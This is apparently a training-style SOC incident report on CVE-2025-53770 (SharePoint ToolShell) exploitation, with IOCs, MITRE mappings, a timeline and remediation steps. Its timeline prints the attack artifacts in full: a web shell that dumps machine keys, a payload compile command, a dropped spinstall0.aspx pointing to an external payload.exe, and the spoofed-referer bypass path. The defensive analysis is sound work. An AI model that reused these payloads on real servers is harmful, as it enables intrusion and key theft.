# SOC342 - CVE‑2025‑53770 SharePoint ToolShell Auth Bypass and RCE  
**Event ID:** 320  
**Date:** 2025-07-22 13:07:00 UTC  
**Alert Priority:**  High. Threat actor has bypassed authentication to reach ToolPane.aspx using a spoofed referer. There are signs of malicious remote code execution.
## MITRE ATT&CK Techniques

| Technique | Reasoning |
|---|---|
| T1190 – Exploit Public-Facing Application | Attacker targeted internet-exposed SharePoint endpoint. |
| T1556 – Modify Authentication Process | Spoofing of the Referer header to bypass authentication. |
| T1555 – Credentials from Password Stores | Extraction of SharePoint's internal cryptographic machine keys. |
| T1105 – Ingress Tool Transfer | Downloads file from external source. |
| T1505.003 – Server Software Component: Web Shell | Drops a malicious ASPX file named spinstall0.aspx into the SharePoint directory. |
| T1059.001 – Command and Scripting Interpreter: PowerShell | Commands run via PowerShell. |
| T1059.003 – Command and Scripting Interpreter: Windows Command Shell | Commands run via cmd.exe. |

## IOCs

| Type | Value |
|---|---|
| URL | /_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx |
| URL  | /_layouts/SignOut.aspx |
| IP | 107.191.58.76 - ISP: Vultr Holdings, LLC. Based in Los Angeles, California.|
| PowerShell Command | See Timeline - 13:07:24 |
| PowerShell Command | See Timeline - 13:07:27 |
| PowerShell Command | See Timeline - 13:07:29 |
| PowerShell Command | See Timeline - 13:07:34 |
 
## Summary: 

On 2025-07-22 at 13:07:00 UTC, a suspicious POST request targeting ToolPane.aspx with large payload size and a spoofed referer was detected. The attack originates from source address 
107.191.58.76 and targets the SharePoint01 endpoint (172.16.20.17). This alert aligns with CVE-2025-53770 exploitation. After further investigation, signs of ToolShell authentication bypass and remote code execution were found. This alert has been deemed a true positive.

## Reasoning:

The attacker spoofs the referer header in their HTTP request in order to bypass authentication to '/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx.' Once the attacker has access to ToolPane.aspx, they perform remote code execution using encoded PowerShell commands to send a malicious payload to the endpoint. Additionally, a web shell was used to extract the server's cryptographic machine keys, which allow the attacker to generate authenticated requests and retain full access if left unpatched. 

## Timeline

| Time (UTC) | Event |
|---|---|
| 2025-07-22 13:07:24 | Encoded PowerShell command ran. Decoded shell from Base64 converts to the following: 'Import Namespace="System.Diagnostics" %> <%@ Import Namespace="System.IO" %> <script runat="server" language="c#" CODEPAGE="65001">
    public void Page_load()
    {
		var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
        var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
        var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
        var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
        Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
    }
</script>' |
| 2025-07-22 13:07:27 | EDR terminal history shows C# was loaded to convert a file named 'payload.cs' into an executable 'payload.exe' and placed in the temp directory: '"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs'. |
| 2025-07-22 13:07:29 | EDR terminal history shows opening 'cmd.exe' to create a new webpage named spinstall0.aspx. This webpage contains a link to download an external payload at 'hxxp://107.191.58.76/payload.exe\': '"C:\Windows\System32\cmd.exe" /c echo <form runat=\"server\"> <object classid=\"clsid:ADB880A6-D8FF-11CF-9377-00AA003B7A11\"><param name=\"Command\" value=\"Redirect\"> <param name=\"Button\" value=\"Test\"> <param name=\"Url\" value=\"http://107.191.58.76/payload.exe\"></object></form> > C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx'|
| 2025-07-22 13:07:34 | EDR terminal history an additional attempt to steal secret keys: '"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Command "[System.Web.Configuration.MachineKeySection]::GetApplicationConfig()"'|
 

## Attack Detail: 

There are 3 main parts to the attack chain present. First, initial access to ToolPane.aspx. The attacker spoofed the Referer header: '/_layouts/SignOut.aspx.' This allowed access to ToolPane.aspx, the page responsible for modifying website settings and layout configs, without any proper authentication. Second, execution of PowerShell commands. The attacker executed an encoded PowerShell command (See Timeline - 13:07:24). This command attempts to steal cryptographic machine keys and return them to the attacker. Third, payload delivery and execution. The attacker converted a file named payload.cs into an executable named payload.exe (See Timeline - 13:07:27). Once created, the attacker creates a new webpage named spinstall0.aspx, which contains a link to download payload.exe (See timeline - 13:07:29).

## Actions Taken:

-Researched CVE‑2025‑53770. According to NIST, this exploit allows attackers to execute code over a network by first spoofing a "Referer" header by sending a manipulated HTTP request. Threat actors send a request claiming to originate from SignOut.aspx in order to bypass authentication to ToolPane.aspx.  
-Examined requested URL and referer. The requested URL is to '/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx', and the referer is '/_layouts/SignOut.aspx'. This matches the pattern for CVE‑2025‑53770.  
-Quarantined SharePoint01 endpoint.  
-Checked source IP address (107[.]191[.]58[.]76) against VirusTotal and AbuseIPDB. There were 11 security vendors on VirusTotal confirming malicious intent, as well as 26 reports of abuse from AbuseIPDB.  
-Checked logs tied to source address (107[.]191[.]58[.]76) and destination SharePoint01 server (172.16.20.17). There were no further logs tied to the source address besides the initial alert trigger. This log confirms a Content-Length of 7699, indicating successful return of a '/_layouts/SignOut.aspx' page.  
-Checked SharePoint01 endpoint through EDR. Found an encoded PowerShell command that steals the server's encryption keys and bypasses standard security restrictions. The command is included in the timeline section. Found 3 commands related to the incident that are detailed in the timeline section.  
-Ruled out any planned Red Team testing by checking email security.  
-Escalated to L2.  

## Reccommended Next Steps:

-Apply official Microsoft security patches for CVE-2025-53770 involving the SharePoint server.  
-Investigate stolen cryptographic machine keys. Invalidate rogue access tokens and sessions.  
-Clean malicious .aspx files.